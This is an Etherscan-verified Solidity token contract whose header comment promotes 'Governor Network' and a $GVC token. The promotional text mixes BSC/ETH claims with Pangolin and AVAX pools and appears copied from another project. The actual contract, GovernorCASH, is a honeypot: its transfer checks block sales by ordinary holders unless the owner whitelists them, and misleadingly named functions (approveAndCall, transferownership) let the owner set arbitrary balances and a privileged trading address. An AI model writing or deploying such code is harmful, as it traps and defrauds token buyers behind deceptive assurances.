/**
 *Submitted for verification at Etherscan.io on 2021-07-23
*/

/*
Governor Network — connect any asset on BSC & ETH

Introduction
Hello everyone! Introducing Governor Network. Our journey begins with creating a Stableswap on BSC & ETH, targeting stablecoin first. However unfortunately the 
 team has been acting much faster than us (kudos to the team for their speed and good work!), so we need to repivot our work to something else.
A recent tweet from Kevin Sekniqi has divulged our latest attempt — to connect various bridged assets on BSC & ETH. Different bridged assets result in fragmented liquidity, and they are very difficult to transfer to each other unless users are paying high transaction fees and slippages. Stableswap provides an excellent solution to tackle this problem.
In light of this, we are partnering with 
Zero Exchange
 to connect the z-tokens to BSC & ETH’s ERC20 tokens! We will gradually expand our scope to enable more assets from different bridges. At the same time, we will list our governance token, $GVC, both in Pangolin and Zero Exchange.
Governance Token: $GVC
Governor’s governance token is $GVC. The supply is capped at 500 million and 60% will be allocated to liquidity mining.

Details of airdrop will be announced later. Developer fund will be locked for 6 months. Ecosystem reserve can be used discretionary by governance token holders after governance is enabled.
Liquidity Mining
The liquidity mining has a declining schedule with 2 halvings. The first 100 million to be distributed in 2 months, next 100 million in 4 months, then last 100 million in 8 months.

There will be 6 mining pools upon project launch:
•  20% for Governor GVC staking
•  20% for Governor zETH-ETH pool
•  10% for Governor zUSDT-USDT pool
•  10% for Governor zDAI-DAI pool
•  20% for Pangolin AVAX-GVC LPs
•  20% for Zero Exchange ZERO-GVC LPs
FAQ
Wen launch? Wen farming?
•  Protocol launch: 7/28 2:00pm UTC
•  Mining Start: 7/30 2:00pm UTC
The above timeline is tentative and subject to changes.
Wen airdrop?
Sorry, no information will be available now. We will release the information in due time.
Is there any risk involved in liquidity mining?
Yes, definitely.
If you are participating in the Governor pools, and one of the assets in a pool significantly depegs, it will effectively mean that pool liquidity providers will be left holding only that asset.
If you are participating in the Pangolin or Zero Exchange LPs, you are exposed to the volatility of the related assets (i.e.: GVC, AVAX, ZERO) and impermanent loss.
If you are participating in GVC staking, you are exposed to the volatility of GVC.
Is the project audited?
Governor was forked from 
Saddle Finance
 and Sushiswap, and all changes associated with the smart contracts were minimized.
The contracts are available at https://github.com/MasterGV

Governor’s solution to the Migrator Function


Many of those in the BSC & ETH defi community have expressed concern over the existence of a migrator function in our code. The migrator function is a notorious “back-door” that exists in the Masterchef contract that has resulted in numerous rug-pull in the past. For instance, the PopcornSwap rug-pull. This was a legacy feature that came from SushiSwap on Ethereum because they needed to forcibly “migrate” Uniswap LPs into their own SushiSwap LP.
Goose Finance was the first project to publicize this issue and removed the migrator backdoor. However, this requires modifying the contract. Alternatively, most other projects have reacted by implementing a Timelock solution instead of directly modifying the Masterchef’s code as it’s more straightforward to implement and provides the same effect.
A timelock is useful because it means that if a malicious developer chooses to rug-pull, the execution will at least be delayed. And if the timelock specified is long enough (say, 24 hours), it would provide sufficient time for LPs to withdraw their liquidity prior to the rug-pull happening.
In addressing this community concern, Governor is implementing a slightly different but still very similar solution to a timelock. We are transferring the Masterchef’s contract ownership to a “MasterchefProxy contract”, with the ability for us to reclaim the ownership after 14 days. The reason is that it provides us the option to migrate to a newer, potentially better, solution in the future (e.g., Gnosis multisig).

Of course, with this solution, theoretically it does allow us to reclaim ownership of the migrator function — but we will only implement this if we feel it is in the very best interest of our users and the project. Moreover any changes will of course be announced well in advance, and as an LP if you do not agree in the actions we take, you will have plenty of time and notice to remove your liquidity in an orderly manner.
In conclusion, we have heard the concerns of the BSC & ETH defi community loud and clear and have implemented a solution we feel addresses the well-known migrator function problem. Now we look forward to continuing our journey of making the best product possible for our users and working through our roadmap!

*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract GovernorCASH {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}